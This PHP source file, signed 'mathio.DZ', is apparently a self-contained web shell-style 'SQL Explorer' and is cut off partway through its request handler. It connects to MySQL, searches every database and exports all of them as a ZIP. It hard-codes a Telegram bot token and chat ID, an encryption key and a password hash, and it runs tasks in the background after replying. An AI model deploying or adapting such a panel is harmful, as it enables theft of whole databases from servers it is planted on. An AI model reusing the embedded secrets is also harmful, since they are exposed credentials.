<?php 
/// (C) by mathio.DZ
error_reporting(E_ALL);
ini_set('display_errors', 1);
// ini_set('error_log', '');
ini_set('upload_max_filesize', '100M');
ini_set('post_max_size', '256M');
ini_set('max_input_time', 300);
ini_set('max_execution_time', 3000);

// Security settings
ini_set('session.cookie_httponly', 1);
ini_set('session.cookie_secure', 1);
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.use_strict_mode', 1);
ini_set('session.use_only_cookies', 1);
ini_set('session.cookie_lifetime', 3600);
ini_set('session.gc_maxlifetime', 3600);
ini_set('session.gc_probability', 1);
ini_set('session.gc_divisor', 100);

define('IsEnc', '0');
define('ENCRYPTION_KEY', 'mysecretkey12345');
define('dbg','0');
$ps = '$2y$10$HuaW7Lm4IdvW5C3RrnL2l.4trvySxRmQ4IU5rXKhGMkNTpXUCfCzK';

// Telegram bot settings
define('TELEGRAM_BOT_TOKEN', '8135395762:AAFvweL_sLJp4g9shWyEI9bJQVy6QLxNlhQ'); // Replace with your actual bot token
define('TELEGRAM_CHAT_ID', '1106954164'); // Replace with your actual chat ID

 
function startBackgroundProcess($response, $backgroundTask, $logFile = null) {
    // === FLUSH RESPONSE IMMEDIATELY TO BROWSER ===
    ignore_user_abort(true);
    
    // Close session before any output to release the lock
    if (session_id()) {
        session_write_close();
    }
    
    @ob_end_clean();
    
    // Explicitly set Content-Length
    $output = encrypt(json_encode($response));
    header("Content-Length: " . strlen($output));
    header("Connection: close");
    header("Content-Encoding: none");
    header("Content-Type: application/json");
    http_response_code(200);
    
    echo $output;
    flush();
    
    // For FastCGI
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    }

    // === CONTINUE BACKGROUND PROCESSING ===
    try {
        $result = $backgroundTask();
        
        if ($logFile !== null && $result !== null) {
            $logData = [
                'timestamp' => date('c'),
                'result' => $result
            ];
            file_put_contents($logFile, json_encode($logData, JSON_PRETTY_PRINT) . "\n", FILE_APPEND);
        }
    } catch (Exception $e) {
        if ($logFile !== null) {
            $logData = [
                'timestamp' => date('c'),
                'error' => $e->getMessage()
            ];
            file_put_contents($logFile, json_encode($logData, JSON_PRETTY_PRINT) . "\n", FILE_APPEND);
        }
    }
    exit;
}
 
class SQL
{
    private $connection = null;
    private $lastError = '';
    private $config = [
        'host' => 'localhost',
        'user' => '',
        'password' => '',
        'database' => '',
        'port' => 3306
    ];
    
    // Add debug log function
    private function debugLog($message) {
     }

    /**
     * Initialize the SQL class
     */
    public function __construct($config = [])
    {
        // Override default config if provided
        if (!empty($config)) {
            $this->config = array_merge($this->config, $config);
        }
        
        // Log constructor call
        $this->debugLog("SQL Explorer initialized with config: " . json_encode($this->config));
    }
    
    /**
     * Load connection from a saved state
     */
    public function loadState($state) {
        $this->debugLog("Loading connection state");
        
        if (!empty($state['config'])) {
            $this->config = $state['config'];
            $this->debugLog("Loaded config from state: " . json_encode($this->config));
        }
        
        // Reconnect using saved config
        if (!empty($this->config['user'])) {
            return $this->connect();
        }
        
        return false;
    }
    
    /**
     * Save connection state
     */
    public function saveState() {
        $this->debugLog("Saving connection state");
        
        return [
            'config' => $this->config,
            'connected' => ($this->connection !== null)
        ];
    }

    /**
     * Connect to the database using provided or stored credentials
     */
    public function connect($host = null, $user = null, $password = null, $database = null, $port = null)
    {
        // Update config if parameters provided
        if ($host !== null) $this->config['host'] = $host;
        if ($user !== null) $this->config['user'] = $user;
        if ($password !== null) $this->config['password'] = $password;
        if ($database !== null) $this->config['database'] = $database;
        if ($port !== null) $this->config['port'] = (int)$port;

        // Log connection attempt
        $this->debugLog("Attempting to connect to MySQL/MariaDB: host={$this->config['host']}, user={$this->config['user']}, database={$this->config['database']}, port={$this->config['port']}");

        // Close existing connection if any
        $this->disconnect();

        try {
            // Create a new connection
            $this->connection = new mysqli(
                $this->config['host'],
                $this->config['user'],
                $this->config['password'],
                $this->config['database'],
                $this->config['port']
            );

            // Check for connection error
            if ($this->connection->connect_errno) {
                $this->lastError = "Connection failed: " . $this->connection->connect_error;
                $this->debugLog("Connection ERROR: " . $this->lastError);
                return false;
            }

            // Set charset to utf8mb4
            $this->connection->set_charset('utf8mb4');
            $this->debugLog("Connection successful!");
            return true;
        } catch (Exception $e) {
            $this->lastError = "Connection exception: " . $e->getMessage();
            $this->debugLog("Connection EXCEPTION: " . $this->lastError);
            return false;
        }
    }

    /**
     * Close the database connection
     */
    public function disconnect()
    {
        if ($this->connection instanceof mysqli) {
            $this->connection->close();
            $this->connection = null;
            $this->debugLog("Disconnected from database");
        }
    }

    /**
     * Get the last error message
     */
    public function getError()
    {
        return $this->lastError;
    }

    /**
     * Get list of databases
     */
    public function getDatabases()
    {
        $this->debugLog("Getting list of databases");
        $result = $this->query("SHOW DATABASES");
        $databases = [];
        
        if ($result) {
            while ($row = $result->fetch_assoc()) {
                $databases[] = $row['Database'];
            }
            $this->debugLog("Found " . count($databases) . " databases: " . implode(", ", $databases));
        } else {
            $this->debugLog("Failed to get databases: " . $this->lastError);
        }
        
        return $databases;
    }

    /**
     * Get list of tables in a database
     */
    public function getTables($database = null)
    {
        if ($database !== null) {
            $this->debugLog("Switching to database: $database");
            $this->query("USE `" . $this->escape($database) . "`");
            // Update the current database in the config
            $this->config['database'] = $database;
            $this->debugLog("Updated config database to: $database");
        }
        
        $result = $this->query("SHOW TABLES");
        $tables = [];
        
        if ($result) {
            while ($row = $result->fetch_row()) {
                $tables[] = $row[0];
            }
            $this->debugLog("Found " . count($tables) . " tables in database " . ($database ?? $this->config['database']));
        } else {
            $this->debugLog("Failed to get tables: " . $this->lastError);
        }
        
        return $tables;
    }

    /**
     * Get table structure (columns)
     */
    public function getTableStructure($table)
    {
        // Ensure we're using the correct database
        if (!empty($this->config['database'])) {
            $this->debugLog("Using database: " . $this->config['database'] . " for table structure");
            $this->query("USE `" . $this->escape($this->config['database']) . "`");
        } else {
            $this->debugLog("No database selected for table structure");
            return [];
        }
        
        $result = $this->query("DESCRIBE `" . $this->escape($table) . "`");
        $columns = [];
        
        if ($result) {
            while ($row = $result->fetch_assoc()) {
                $columns[] = $row;
            }
            $this->debugLog("Found " . count($columns) . " columns in table $table");
        } else {
            $this->debugLog("Failed to get table structure: " . $this->lastError);
        }
        
        return $columns;
    }
    
    /**
     * Get table indexes
     */
    public function getTableIndexes($table)
    {
        // Ensure we're using the correct database
        if (!empty($this->config['database'])) {
            $this->debugLog("Using database: " . $this->config['database'] . " for table indexes");
            $this->query("USE `" . $this->escape($this->config['database']) . "`");
        } else {
            $this->debugLog("No database selected for table indexes");
            return [];
        }
        
        $result = $this->query("SHOW INDEX FROM `" . $this->escape($table) . "`");
        $indexes = [];
        
        if ($result) {
            while ($row = $result->fetch_assoc()) {
                $indexes[] = $row;
            }
            $this->debugLog("Found " . count($indexes) . " indexes in table $table");
        } else {
            $this->debugLog("Failed to get table indexes: " . $this->lastError);
        }
        
        return $indexes;
    }
    
    /**
     * Get table data with pagination, sorting and search
     */
    public function getTableData($table, $page = 1, $limit = 50, $orderBy = null, $orderDir = 'ASC', $search = null)
    {
        // Ensure we're using the correct database
        if (!empty($this->config['database'])) {
            $this->debugLog("Using database: " . $this->config['database'] . " for table data");
            $this->query("USE `" . $this->escape($this->config['database']) . "`");
        } else {
            $this->debugLog("No database selected for table data");
            return [];
        }
        
        $offset = ($page - 1) * $limit;
        $sql = "SELECT * FROM `" . $this->escape($table) . "`";
        
        // Add search condition across all columns if search parameter is provided
        if ($search !== null && $search !== '') {
            $this->debugLog("Adding search condition for: " . $search);
            
            // First get the columns in this table
            $columns = $this->getTableStructure($table);
            if (!empty($columns)) {
                $searchConditions = [];
                foreach ($columns as $col) {
                    $colName = $col['Field'];
                    $searchConditions[] = "`" . $this->escape($colName) . "` LIKE '%" . $this->escape($search) . "%'";
                }
                
                if (!empty($searchConditions)) {
                    $sql .= " WHERE " . implode(" OR ", $searchConditions);
                }
            }
        }
        
        if ($orderBy !== null) {
            $sql .= " ORDER BY `" . $this->escape($orderBy) . "` " . ($orderDir === 'DESC' ? 'DESC' : 'ASC');
        }
        
        $sql .= " LIMIT " . (int)$offset . ", " . (int)$limit;
        
        $result = $this->query($sql);
        $data = [];
        
        if ($result) {
            while ($row = $result->fetch_assoc()) {
                $data[] = $row;
            }
            $this->debugLog("Found " . count($data) . " rows in table $table (page $page, limit $limit)");
        } else {
            $this->debugLog("Failed to get table data: " . $this->lastError);
        }
        
        return $data;
    }
    
    /**
     * Get row count for a table, with optional search filter
     */
    public function getTableCount($table, $search = null)
    {
        // Ensure we're using the correct database
        if (!empty($this->config['database'])) {
            $this->debugLog("Using database: " . $this->config['database'] . " for table count");
            $this->query("USE `" . $this->escape($this->config['database']) . "`");
        } else {
            $this->debugLog("No database selected for table count");
            return 0;
        }
        
        $sql = "SELECT COUNT(*) as count FROM `" . $this->escape($table) . "`";
        
        // Add search condition across all columns if search parameter is provided
        if ($search !== null && $search !== '') {
            $this->debugLog("Adding search condition for count: " . $search);
            
            // First get the columns in this table
            $columns = $this->getTableStructure($table);
            if (!empty($columns)) {
                $searchConditions = [];
                foreach ($columns as $col) {
                    $colName = $col['Field'];
                    $searchConditions[] = "`" . $this->escape($colName) . "` LIKE '%" . $this->escape($search) . "%'";
                }
                
                if (!empty($searchConditions)) {
                    $sql .= " WHERE " . implode(" OR ", $searchConditions);
                }
            }
        }
        
        $result = $this->query($sql);
        
        if ($result && $row = $result->fetch_assoc()) {
            $count = (int)$row['count'];
            $this->debugLog("Table $table has $count rows" . ($search ? " matching search" : ""));
            return $count;
        }
        
        $this->debugLog("Failed to get row count for table $table");
        return 0;
    }

    /**
     * Execute a query
     */
    public function query($sql)
    {
        if (!$this->connection) {
            $this->lastError = "No active connection";
            $this->debugLog("Query error: " . $this->lastError . " - SQL: $sql");
            return false;
        }

        $this->debugLog("Executing query: $sql");
        try {
            $result = $this->connection->query($sql);
            
            if ($result === false) {
                $this->lastError = "Query error: " . $this->connection->error;
                $this->debugLog("Query ERROR: " . $this->lastError);
                return false;
            }
            
            return $result;
        } catch (Exception $e) {
            $this->lastError = "Query exception: " . $e->getMessage();
            $this->debugLog("Query EXCEPTION: " . $this->lastError);
            return false;
        }
    }
    
    /**
     * Execute a query and return affected rows
     */
    public function execute($sql)
    {
        if (!$this->connection) {
            $this->lastError = "No active connection";
            return false;
        }
        
        try {
            $this->connection->query($sql);
            
            if ($this->connection->errno) {
                $this->lastError = "Execute error: " . $this->connection->error;
                return false;
            }
            
            return $this->connection->affected_rows;
        } catch (Exception $e) {
            $this->lastError = "Execute exception: " . $e->getMessage();
            return false;
        }
    }
    
    /**
     * Escape a string for use in SQL queries
     */
    public function escape($string)
    {
        if (!$this->connection) {
            return addslashes($string);
        }
        
        return $this->connection->real_escape_string($string);
    }
    
    /**
     * Get status information about the server
     */
    public function getServerInfo()
    {
        if (!$this->connection) {
            return [];
        }
        
        $info = [
            'version' => $this->connection->server_info,
            'host' => $this->connection->host_info,
            'protocol' => $this->connection->protocol_version,
            'client' => $this->connection->client_info
        ];
        
        $result = $this->query("SHOW VARIABLES LIKE 'version%'");
        if ($result) {
            while ($row = $result->fetch_assoc()) {
                $info[$row['Variable_name']] = $row['Value'];
            }
        }
        
        return $info;
    }

    /**
     * Get primary key column(s) for a table
     */
    public function getPrimaryKey($table)
    {
        $this->debugLog("Getting primary key for table: $table");
        
        // Ensure we're using the correct database
        if (!empty($this->config['database'])) {
            $this->debugLog("Using database: " . $this->config['database'] . " for primary key");
            $this->query("USE `" . $this->escape($this->config['database']) . "`");
        } else {
            $this->debugLog("No database selected for primary key");
            return [];
        }
        
        $primaryKeys = [];
        
        $result = $this->query("SHOW KEYS FROM `" . $this->escape($table) . "` WHERE Key_name = 'PRIMARY'");
        
        if ($result) {
            while ($row = $result->fetch_assoc()) {
                $primaryKeys[] = $row['Column_name'];
            }
        }
        
        $this->debugLog("Primary keys found: " . implode(', ', $primaryKeys));
        return $primaryKeys;
    }
    
    /**
     * Get a single row from a table by its primary key
     */
    public function getRow($table, $primaryKeyCol, $primaryKeyVal)
    {
        $this->debugLog("Getting row from $table where $primaryKeyCol = " . $primaryKeyVal);
        
        $sql = "SELECT * FROM `" . $this->escape($table) . "` WHERE 
                `" . $this->escape($primaryKeyCol) . "` = '" . $this->escape($primaryKeyVal) . "' LIMIT 1";
        
        $result = $this->query($sql);
        
        if ($result && $row = $result->fetch_assoc()) {
            return $row;
        }
        
        return null;
    }
    
    /**
     * Update a row in a table
     */
    public function updateRow($table, $primaryKeyCol, $primaryKeyVal, $data)
    {
        $this->debugLog("Updating row in $table where $primaryKeyCol = $primaryKeyVal");
        
        $setStatements = [];
        foreach ($data as $column => $value) {
            // Skip the primary key column
            if ($column == $primaryKeyCol) continue;
            
            // Handle NULL values
            if ($value === null || strtoupper($value) === 'NULL') {
                $setStatements[] = "`" . $this->escape($column) . "` = NULL";
            } else {
                $setStatements[] = "`" . $this->escape($column) . "` = '" . $this->escape($value) . "'";
            }
        }
        
        if (empty($setStatements)) {
            $this->lastError = "No data to update";
            return false;
        }
        
        $sql = "UPDATE `" . $this->escape($table) . "` SET " . implode(', ', $setStatements) . " 
                WHERE `" . $this->escape($primaryKeyCol) . "` = '" . $this->escape($primaryKeyVal) . "'";
                
        return $this->execute($sql);
    }
    
    /**
     * Insert a new row into a table
     */
    public function insertRow($table, $data)
    {
        $this->debugLog("Inserting new row into $table");
        
        $columns = [];
        $values = [];
        
        foreach ($data as $column => $value) {
            $columns[] = "`" . $this->escape($column) . "`";
            
            // Handle NULL values
            if ($value === null || strtoupper($value) === 'NULL') {
                $values[] = "NULL";
            } else {
                $values[] = "'" . $this->escape($value) . "'";
            }
        }
        
        $sql = "INSERT INTO `" . $this->escape($table) . "` 
                (" . implode(', ', $columns) . ") 
                VALUES (" . implode(', ', $values) . ")";
                
        return $this->execute($sql);
    }
    
    /**
     * Delete a row from a table
     */
    public function deleteRow($table, $primaryKeyCol, $primaryKeyVal)
    {
        $this->debugLog("Deleting row from $table where $primaryKeyCol = $primaryKeyVal");
        
        $sql = "DELETE FROM `" . $this->escape($table) . "` 
                WHERE `" . $this->escape($primaryKeyCol) . "` = '" . $this->escape($primaryKeyVal) . "'";
                
        return $this->execute($sql);
    }
    
    /**
     * Get the last insert ID from the most recent INSERT operation
     */
    public function getLastInsertId()
    {
        if (!$this->connection) {
            return 0;
        }
        
        return $this->connection->insert_id;
    }
    
    /**
     * Get column information including data types
     */
    public function getColumnTypes($table)
    {
        $this->debugLog("Getting column types for table: $table");
        
        // Use INFORMATION_SCHEMA to get detailed column info
        $sql = "SELECT COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH, IS_NULLABLE, COLUMN_DEFAULT, COLUMN_KEY, EXTRA
                FROM INFORMATION_SCHEMA.COLUMNS 
                WHERE TABLE_SCHEMA = '" . $this->escape($this->config['database']) . "' 
                AND TABLE_NAME = '" . $this->escape($table) . "'
                ORDER BY ORDINAL_POSITION";
                
        $result = $this->query($sql);
        $columns = [];
        
        if ($result) {
            while ($row = $result->fetch_assoc()) {
                $columns[$row['COLUMN_NAME']] = $row;
            }
            $this->debugLog("Found " . count($columns) . " column types for table $table");
        } else {
            $this->debugLog("Failed to get column types: " . $this->lastError);
        }
        
        return $columns;
    }

    /**
     * Export table as SQL
     */
    public function exportTableAsSql($table, $includeStructure = true, $includeData = true, $addDropTable = true)
    {
        $this->debugLog("Exporting table as SQL: $table");
        
        if (empty($table)) {
            $this->lastError = "No table specified for SQL export";
            return false;
        }
        
        // Ensure we're using the correct database
        if (!empty($this->config['database'])) {
            $this->query("USE `" . $this->escape($this->config['database']) . "`");
        } else {
            $this->lastError = "No database selected for SQL export";
            return false;
        }
        
        $output = "-- SQL Export for table `$table`\n";
        $output .= "-- Generated on " . date('Y-m-d H:i:s') . "\n";
        $output .= "-- Database: `" . $this->config['database'] . "`\n\n";
        
        // Set SQL mode for compatibility
        $output .= "SET SQL_MODE = \"NO_AUTO_VALUE_ON_ZERO\";\n";
        $output .= "SET time_zone = \"+00:00\";\n\n";
        
        // Export table structure
        if ($includeStructure) {
            if ($addDropTable) {
                $output .= "DROP TABLE IF EXISTS `$table`;\n";
            }
            
            // Get create table statement
            $result = $this->query("SHOW CREATE TABLE `" . $this->escape($table) . "`");
            if ($result && $row = $result->fetch_assoc()) {
                $output .= $row['Create Table'] . ";\n\n";
            } else {
                $this->lastError = "Failed to get table structure: " . $this->connection->error;
                return false;
            }
        }
        
        // Export table data
        if ($includeData) {
            // Get table data
            $result = $this->query("SELECT * FROM `" . $this->escape($table) . "`");
            
            if ($result && $result->num_rows > 0) {
                $output .= "-- Dumping data for table `$table`\n";
                
                // Get column names
                $columns = [];
                $columnTypes = [];
                
                $fieldsResult = $this->query("DESCRIBE `" . $this->escape($table) . "`");
                if ($fieldsResult) {
                    while ($field = $fieldsResult->fetch_assoc()) {
                        $columns[] = $field['Field'];
                        // Determine if this is a numeric or string type
                        $type = strtolower($field['Type']);
                        if (strpos($type, 'int') !== false || 
                            strpos($type, 'float') !== false || 
                            strpos($type, 'double') !== false || 
                            strpos($type, 'decimal') !== false) {
                            $columnTypes[$field['Field']] = 'numeric';
                        } else {
                            $columnTypes[$field['Field']] = 'string';
                        }
                    }
                }
                
                // Generate INSERT statements
                $output .= "INSERT INTO `$table` (`" . implode("`, `", $columns) . "`) VALUES\n";
                
                $rowCount = 0;
                $totalRows = $result->num_rows;
                
                while ($row = $result->fetch_assoc()) {
                    $rowCount++;
                    $values = [];
                    
                    foreach ($columns as $column) {
                        if ($row[$column] === null) {
                            $values[] = "NULL";
                        } else if ($columnTypes[$column] === 'numeric') {
                            $values[] = $row[$column];
                        } else {
                            $values[] = "'" . $this->connection->real_escape_string($row[$column]) . "'";
                        }
                    }
                    
                    $output .= "(" . implode(", ", $values) . ")";
                    
                    if ($rowCount < $totalRows) {
                        $output .= ",\n";
                    } else {
                        $output .= ";\n";
                    }
                    
                    // Add batch inserts for large tables
                    if ($rowCount % 100 === 0 && $rowCount < $totalRows) {
                        $output .= ";\n\nINSERT INTO `$table` (`" . implode("`, `", $columns) . "`) VALUES\n";
                    }
                }
                
                $output .= "\n";
            }
        }
        
        return $output;
    }
    
    /**
     * Export table as CSV
     */
    public function exportTableAsCsv($table)
    {
        $this->debugLog("Exporting table as CSV: $table");
        
        if (empty($table)) {
            $this->lastError = "No table specified for CSV export";
            return false;
        }
        
        // Ensure we're using the correct database
        if (!empty($this->config['database'])) {
            $this->query("USE `" . $this->escape($this->config['database']) . "`");
        } else {
            $this->lastError = "No database selected for CSV export";
            return false;
        }
        
        // Get column names
        $columns = [];
        $result = $this->query("DESCRIBE `" . $this->escape($table) . "`");
        if ($result) {
            while ($row = $result->fetch_assoc()) {
                $columns[] = $row['Field'];
            }
        } else {
            $this->lastError = "Failed to get table structure: " . $this->connection->error;
            return false;
        }
        
        // Start CSV output with column headers
        $output = $this->arrayToCsvLine($columns);
        
        // Get table data
        $result = $this->query("SELECT * FROM `" . $this->escape($table) . "`");
        if ($result) {
            while ($row = $result->fetch_assoc()) {
                $values = [];
                foreach ($columns as $column) {
                    $values[] = $row[$column];
                }
                $output .= $this->arrayToCsvLine($values);
            }
        } else {
            $this->lastError = "Failed to get table data: " . $this->connection->error;
            return false;
        }
        
        return $output;
    }
    
    /**
     * Helper function to convert array to CSV line
     */
    private function arrayToCsvLine($fields)
    {
        $csvLine = '';
        $processedFields = [];
        
        foreach ($fields as $field) {
            // Handle null values
            if ($field === null) {
                $processedFields[] = '';
            } else {
                // Escape quotes and wrap in quotes
                $field = str_replace('"', '""', $field);
                $processedFields[] = '"' . $field . '"';
            }
        }
        
        $csvLine = implode(',', $processedFields) . "\n";
        return $csvLine;
    }
    
    /**
     * Export database as ZIP
     */
    public function exportDatabaseAsZip($includeStructure = true, $includeData = true, $addDropTable = true, $compressed = true)
    {
        $this->debugLog("Exporting database as ZIP: " . $this->config['database']);
        
        if (empty($this->config['database'])) {
            $this->lastError = "No database selected for ZIP export";
            return false;
        }
        
        // Create a temporary directory
        $tempDir = sys_get_temp_dir() . '/sqlexport_' . uniqid();
        if (!mkdir($tempDir, 0755, true)) {
            $this->lastError = "Failed to create temporary directory";
            return false;
        }
        
        // Get list of tables
        $tables = $this->getTables();
        if (empty($tables)) {
            $this->lastError = "No tables found in database";
            rmdir($tempDir);
            return false;
        }
        
        // Export each table as a separate SQL file
        foreach ($tables as $table) {
            $sql = $this->exportTableAsSql($table, $includeStructure, $includeData, $addDropTable);
            if ($sql) {
                file_put_contents($tempDir . '/' . $table . '.sql', $sql);
            }
            
            // Also export as CSV
            $csv = $this->exportTableAsCsv($table);
            if ($csv) {
                file_put_contents($tempDir . '/' . $table . '.csv', $csv);
            }
        }
        
        // Create a README file
        $readme = "Database Export: " . $this->config['database'] . "\n";
        $readme .= "Generated: " . date('Y-m-d H:i:s') . "\n";
        $readme .= "Tables: " . implode(", ", $tables) . "\n\n";
        $readme .= "This archive contains SQL and CSV exports of all tables.\n";
        file_put_contents($tempDir . '/README.txt', $readme);
        
        // Create ZIP archive
        $zipFile = sys_get_temp_dir() . '/' . $this->config['database'] . '_export_' . date('Ymd_His') . '.zip';
        $zip = new ZipArchive();
        
        $zipFlags = ZipArchive::CREATE;
        if ($compressed) {
            $zipFlags |= ZipArchive::CM_DEFLATE;
        }
        
        if ($zip->open($zipFile, $zipFlags) !== true) {
            $this->lastError = "Failed to create ZIP archive";
            $this->cleanupTempDir($tempDir);
            return false;
        }
        
        // Add files to ZIP
        $files = scandir($tempDir);
        foreach ($files as $file) {
            if ($file != '.' && $file != '..') {
                $zip->addFile($tempDir . '/' . $file, $file);
            }
        }
        
        $zip->close();
        
        // Read the ZIP file contents
        $zipContent = file_get_contents($zipFile);
        
        // Clean up
        $this->cleanupTempDir($tempDir);
        unlink($zipFile);
        
        return $zipContent;
    }
    
    /**
     * Helper function to clean up temporary directory recursively
     */
    private function cleanupTempDir($dir)
    {
        if (!is_dir($dir)) {
            return;
        }
        
            $files = scandir($dir);
            foreach ($files as $file) {
                if ($file != '.' && $file != '..') {
                $path = $dir . '/' . $file;
                if (is_dir($path)) {
                    $this->cleanupTempDir($path);
                } else {
                    @unlink($path);
                }
            }
        }
        @rmdir($dir);
    }

    /**
     * Global search across all databases and tables
     * @param string $searchQuery The search term to look for
     * @param int $limit Maximum number of results per table
     * @return array Search results by database and table
     */
    public function globalSearch($searchQuery, $limit = 10)
    {
        if (empty($searchQuery)) {
            return [];
        }
        
        $this->debugLog("Performing global search for: $searchQuery");
        $results = [];
        
        // Get all databases
        $databases = $this->getDatabases();
        
        foreach ($databases as $database) {
            // Skip system databases
            if (in_array(strtolower($database), ['information_schema', 'mysql', 'performance_schema', 'sys'])) {
                continue;
            }
            
            $this->debugLog("Searching in database: $database");
            $this->query("USE `" . $this->escape($database) . "`");
            
            // Get tables in this database
            $tables = $this->getTables($database);
            $dbResults = [];
            
            foreach ($tables as $table) {
                $this->debugLog("Searching in table: $table");
                
                // Get columns in this table
                $columns = $this->getTableStructure($table);
                if (empty($columns)) {
                    continue;
                }
                
                // Build search conditions for all columns
                $searchConditions = [];
                $allColumns = [];
                
                foreach ($columns as $col) {
                    $colName = $col['Field'];
                    $allColumns[] = $colName;
                    $searchConditions[] = "`" . $this->escape($colName) . "` LIKE '%" . $this->escape($searchQuery) . "%'";
                }
                
                if (empty($searchConditions)) {
                    continue;
                }
                
                // Build the query to search in this table
                $sql = "SELECT * FROM `" . $this->escape($table) . "` WHERE " . 
                      implode(" OR ", $searchConditions) . 
                      " LIMIT " . (int)$limit;
                
                $result = $this->query($sql);
                if (!$result) {
                    continue;
                }
                
                $matches = [];
                $rowCount = 0;
                
                while ($row = $result->fetch_assoc()) {
                    // Find which columns matched the search query
                    $matchingColumns = [];
                    foreach ($row as $col => $val) {
                        if (is_string($val) && stripos($val, $searchQuery) !== false) {
                            $matchingColumns[] = $col;
                        }
                    }
                    
                    if (!empty($matchingColumns)) {
                        $matches[] = [
                            'row' => $row,
                            'matching_columns' => $matchingColumns
                        ];
                        $rowCount++;
                    }
                }
                
                // Count total matches in this table
                $countSql = "SELECT COUNT(*) as count FROM `" . $this->escape($table) . "` WHERE " . 
                           implode(" OR ", $searchConditions);
                $countResult = $this->query($countSql);
                $totalMatches = 0;
                
                if ($countResult && $countRow = $countResult->fetch_assoc()) {
                    $totalMatches = (int)$countRow['count'];
                }
                
                if ($rowCount > 0) {
                    $dbResults[$table] = [
                        'matches' => $matches,
                        'total_matches' => $totalMatches,
                        'has_more' => ($totalMatches > $limit),
                        'columns' => $allColumns
                    ];
                }
            }
            
            if (!empty($dbResults)) {
                $results[$database] = $dbResults;
            }
        }
        
        $this->debugLog("Global search completed, found results in " . count($results) . " databases");
        return $results;
    }

    /**
     * Export all databases as ZIP using memory streams
     */
    public function exportAllDatabasesAsZip($includeStructure = true, $includeData = true, $addDropTable = true, $compressed = true)
    {
        $this->debugLog("Exporting all databases as ZIP using memory streams");
        
        // Get list of all databases
        $databases = $this->getDatabases();
        if (empty($databases)) {
            $this->lastError = "No databases found";
            return false;
        }
        
        // Filter out system databases
        $databases = array_filter($databases, function($db) {
            return !in_array(strtolower($db), ['information_schema', 'mysql', 'performance_schema', 'sys']);
        });
        
        if (empty($databases)) {
            $this->lastError = "No non-system databases found";
            return false;
        }
        
        // Create a ZIP archive in memory using temporary file
        $zipFile = tempnam(sys_get_temp_dir(), 'sqlexport_');
        $zip = new ZipArchive();
        
        $zipFlags = ZipArchive::CREATE | ZipArchive::OVERWRITE;
        if ($compressed) {
            $zipFlags |= ZipArchive::CM_DEFLATE;
        }
        
        if ($zip->open($zipFile, $zipFlags) !== true) {
            $this->lastError = "Failed to create ZIP archive";
            return false;
        }
        
        // Create a main README file
        $mainReadme = "All Databases Export\n";
        $mainReadme .= "Generated: " . date('Y-m-d H:i:s') . "\n";
        $mainReadme .= "Databases: " . implode(", ", $databases) . "\n\n";
        $mainReadme .= "This archive contains exports of all user databases. Each database has its own directory.\n";
        $zip->addFromString('README.txt', $mainReadme);
        
        // For each database, export all tables
        foreach ($databases as $database) {
            $this->debugLog("Exporting database: $database");
            
            // Switch to this database
            if (!$this->query("USE `" . $this->escape($database) . "`")) {
                $this->debugLog("Failed to switch to database: $database");
                continue;
            }
            
            // Create directory for this database
            $zip->addEmptyDir($database);
            
            // Get list of tables
            $tables = $this->getTables();
            if (empty($tables)) {
                $this->debugLog("No tables found in database: $database");
                continue;
            }
            
            // Export each table as a separate SQL file
            foreach ($tables as $table) {
                $sql = $this->exportTableAsSql($table, $includeStructure, $includeData, $addDropTable);
                if ($sql) {
                    $zip->addFromString("$database/$table.sql", $sql);
                }
                
                // Also export as CSV
                $csv = $this->exportTableAsCsv($table);
                if ($csv) {
                    $zip->addFromString("$database/$table.csv", $csv);
                }
            }
        }
        
        // Close the ZIP file
        $zip->close();
        
        // Read the ZIP file contents
        $zipContent = file_get_contents($zipFile);
        
        // Delete the temporary file
        unlink($zipFile);
        
        return $zipContent;
    }
    

}
 
class SQLExplorerAPI
{
    private $sql;
    
    // Add debug log function
    private function debugLog($message) {
     }
    
    public function __construct()
    {
        // Start session if not already started
        if (session_status() === PHP_SESSION_NONE) {
            session_start();
        }
        
        $this->sql = new SQL();
        $this->debugLog("SQLExplorerAPI initialized");
        
        // Load connection state from session if available
        if (isset($_SESSION['sql_explorer_state'])) {
            $this->debugLog("Found saved connection state in session");
            $state = $_SESSION['sql_explorer_state'];
            $this->sql->loadState($state);
        } else {
            $this->debugLog("No saved connection state found in session");
        }
    }
    
    /**
     * Handle API requests for SQL Explorer
     */
    public function handleRequest($action, $params = [])
    {
        $this->debugLog("API Request: action=$action, params=" . json_encode($params));
        $response = ['success' => false];
        
        switch ($action) {
            case 'connect':
                $this->debugLog("Processing connect request");
                $success = $this->sql->connect(
                    $params['host'] ?? null,
                    $params['user'] ?? null, 
                    $params['password'] ?? null, 
                    $params['database'] ?? null,
                    $params['port'] ?? null
                );
                $response['success'] = $success;
                if (!$success) {
                    $response['error'] = $this->sql->getError();
                    $this->debugLog("Connection failed: " . $this->sql->getError());
                } else {
                    // Save connection state to session
                    $_SESSION['sql_explorer_state'] = $this->sql->saveState();
                    $this->debugLog("Connection successful - Saved state to session");
                }
                break;
                
            case 'disconnect':
                $this->debugLog("Processing disconnect request");
                $this->sql->disconnect();
                // Clear the session state
                if (isset($_SESSION['sql_explorer_state'])) {
                    unset($_SESSION['sql_explorer_state']);
                    $this->debugLog("Cleared connection state from session");
                }
                $response['success'] = true;
                break;
                
            case 'databases':
                $this->debugLog("Processing databases request");
                $databases = $this->sql->getDatabases();
                $response['success'] = true;
                $response['databases'] = $databases;
                $this->debugLog("Databases response: " . count($databases) . " databases found");
                break;
                
            case 'tables':
                $this->debugLog("Processing tables request for database: " . ($params['database'] ?? 'not specified'));
                $tables = $this->sql->getTables($params['database'] ?? null);
                $response['success'] = true;
                $response['tables'] = $tables;
                $this->debugLog("Tables response: " . count($tables) . " tables found");
                break;
                
            case 'structure':
                $this->debugLog("Processing structure request for table: " . ($params['table'] ?? 'not specified'));
                $columns = $this->sql->getTableStructure($params['table'] ?? '');
                $response['success'] = true;
                $response['columns'] = $columns;
                
                // Get primary key information
                $primaryKeys = $this->sql->getPrimaryKey($params['table'] ?? '');
                $response['primaryKeys'] = $primaryKeys;
                
                // Get detailed column type information
                $columnTypes = $this->sql->getColumnTypes($params['table'] ?? '');
                $response['columnTypes'] = $columnTypes;
                
                break;
                
            case 'indexes':
                $this->debugLog("Processing indexes request for table: " . ($params['table'] ?? 'not specified'));
                $indexes = $this->sql->getTableIndexes($params['table'] ?? '');
                $response['success'] = true;
                $response['indexes'] = $indexes;
                break;
                
            case 'data':
